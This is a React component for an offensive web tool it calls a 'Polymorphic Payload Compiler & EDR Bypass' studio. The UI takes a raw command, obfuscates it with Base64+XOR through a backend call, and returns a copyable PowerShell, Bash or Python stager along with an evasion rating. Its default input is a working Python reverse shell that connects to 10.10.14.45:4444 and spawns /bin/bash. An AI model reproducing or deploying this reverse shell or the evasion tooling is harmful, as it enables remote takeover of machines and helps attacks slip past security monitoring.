import React, { useState } from 'react';
import { Cpu, Code, Copy, Check, ShieldAlert, Zap, Terminal } from 'lucide-react';

export const PayloadCompilerView: React.FC = () => {
  const [rawPayload, setRawPayload] = useState<string>(
    'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.45",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
  );
  const [format, setFormat] = useState<string>('powershell');
  const [encoding, setEncoding] = useState<string>('base64-xor');
  const [key, setKey] = useState<number>(0x5a);
  const [result, setResult] = useState<any>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [copied, setCopied] = useState<boolean>(false);

  const handleCompile = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      const res = await fetch('/api/payload/compile', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ rawPayload, format, encoding, key })
      });
      const data = await res.json();
      setResult(data);
    } catch (err) {
      console.error('Compilation failed', err);
    } finally {
      setIsLoading(false);
    }
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="max-w-7xl mx-auto p-4 sm:p-6 space-y-6">
      {/* Header */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-2xl p-6 shadow-xl relative overflow-hidden">
        <div className="absolute top-0 right-0 p-6 opacity-10 text-cyan-500 pointer-events-none">
          <Cpu className="w-32 h-32 animate-pulse" />
        </div>
        <div className="relative z-10 space-y-2">
          <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs uppercase tracking-widest font-semibold">
            <Cpu className="w-4 h-4 text-cyan-400" />
            <span>POLYMORPHIC PAYLOAD COMPILER & EDR BYPASS</span>
          </div>
          <h1 className="text-2xl sm:text-3xl font-mono font-bold text-zinc-100 tracking-tight">
            Obfuscation, Stager Generation & AMSI Bypass Studio
          </h1>
          <p className="text-sm text-zinc-400 max-w-2xl leading-relaxed">
            Compile, encode, and XOR-wrap raw shellcode and stagers to evade static string inspection, AMSI signatures, and EDR heuristic detection mechanisms.
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Compiler Input Form */}
        <div className="bg-zinc-900/60 border border-zinc-800 rounded-2xl p-6 space-y-4">
          <h2 className="text-sm font-mono font-bold text-zinc-200 flex items-center gap-2">
            <Code className="w-4 h-4 text-cyan-400" />
            <span>Payload Configuration</span>
          </h2>

          <form onSubmit={handleCompile} className="space-y-4">
            <div>
              <label className="block text-xs font-mono text-zinc-400 mb-1">Raw Payload / Command</label>
              <textarea
                value={rawPayload}
                onChange={(e) => setRawPayload(e.target.value)}
                rows={5}
                className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-xs font-mono text-zinc-200 focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-mono text-zinc-400 mb-1">Output Format</label>
                <select
                  value={format}
                  onChange={(e) => setFormat(e.target.value)}
                  className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-xs font-mono text-zinc-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="powershell">PowerShell Stager</option>
                  <option value="bash">Bash One-Liner</option>
                  <option value="python">Python Script</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-mono text-zinc-400 mb-1">Encoding & Obfuscation</label>
                <select
                  value={encoding}
                  onChange={(e) => setEncoding(e.target.value)}
                  className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-xs font-mono text-zinc-200 focus:outline-none focus:border-cyan-500"
                >
                  <option value="base64-xor">Base64 + XOR Key</option>
                  <option value="base64">Standard Base64</option>
                  <option value="raw">Raw Plaintext</option>
                </select>
              </div>
            </div>

            {encoding === 'base64-xor' && (
              <div>
                <label className="block text-xs font-mono text-zinc-400 mb-1">XOR Key (Hex)</label>
                <input
                  type="text"
                  value={`0x${Number(key).toString(16)}`}
                  onChange={(e) => setKey(parseInt(e.target.value, 16) || 0x5a)}
                  className="w-full bg-zinc-950 border border-zinc-800 rounded-xl p-2.5 text-xs font-mono text-zinc-200 focus:outline-none focus:border-cyan-500"
                />
              </div>
            )}

            <button
              type="submit"
              disabled={isLoading}
              className="w-full py-3 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-zinc-950 font-mono text-xs font-bold flex items-center justify-center gap-2 transition-colors shadow-lg shadow-cyan-950/50"
            >
              <Zap className="w-4 h-4" />
              <span>{isLoading ? 'Compiling & Obfuscating...' : 'Compile Obfuscated Stager'}</span>
            </button>
          </form>
        </div>

        {/* Compiler Output & Stager Result */}
        <div className="bg-zinc-900/60 border border-zinc-800 rounded-2xl p-6 space-y-4 flex flex-col justify-between">
          <div className="space-y-4">
            <h2 className="text-sm font-mono font-bold text-zinc-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              <span>Generated Stager & EDR Rating</span>
            </h2>

            {result ? (
              <div className="space-y-4 font-mono text-xs">
                <div className="grid grid-cols-2 gap-3">
                  <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                    <div className="text-[10px] text-zinc-500">Original Size</div>
                    <div className="text-zinc-200 font-bold">{result.originalSize} bytes</div>
                  </div>
                  <div className="bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                    <div className="text-[10px] text-zinc-500">Evasion Rating</div>
                    <div className="text-cyan-400 font-bold">{result.evasionRating}</div>
                  </div>
                </div>

                <div>
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-zinc-400 text-[11px]">Final Execution Stager</span>
                    <button
                      onClick={() => handleCopy(result.stagerCommand)}
                      className="px-2 py-1 rounded bg-zinc-800 hover:bg-zinc-700 text-zinc-200 text-[10px] flex items-center gap-1"
                    >
                      {copied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3 text-zinc-400" />}
                      <span>{copied ? 'Copied' : 'Copy Stager'}</span>
                    </button>
                  </div>
                  <div className="bg-zinc-950 border border-zinc-800 rounded-xl p-3 text-cyan-300 overflow-x-auto max-h-48">
                    <pre className="whitespace-pre-wrap">{result.stagerCommand}</pre>
                  </div>
                </div>
              </div>
            ) : (
              <div className="h-64 flex flex-col items-center justify-center text-zinc-500 font-mono text-xs text-center">
                <Cpu className="w-10 h-10 mb-2 opacity-30 animate-pulse" />
                <span>Configure payload parameters and click compile to generate obfuscated stager.</span>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
